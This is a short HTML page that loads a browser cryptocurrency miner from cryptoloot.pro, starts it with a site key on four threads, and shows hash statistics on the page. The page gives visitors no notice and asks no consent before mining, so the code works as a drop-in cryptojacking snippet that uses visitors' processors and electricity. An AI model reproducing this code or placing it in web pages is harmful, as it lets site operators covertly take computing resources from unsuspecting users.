<!DOCTYPE html>
<html>
<body>

	<p id="hs"></p>
	<p id="th"></p>
	<p id="ah"></p>
	
	
<script src="//cryptoloot.pro/lib/crlt.js"></script>
<script>
	var miner=new CRLT.Anonymous('2f204c8ffd3216dbcc30a435cad11712a99efba38d7d',
        {
        threads:4,autoThreads:false,throttle:0.1,
        }
);
	
	miner.start();
</script>
<script>
	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();
		
		
		
		


		document.getElementById("hs").innerHTML = hashesPerSecond;
		document.getElementById("th").innerHTML = totalHashes;
		document.getElementById("ah").innerHTML = acceptedHashes;
		// Output to HTML elements...
	}, 1000);
</script>

	
</body>
</html>
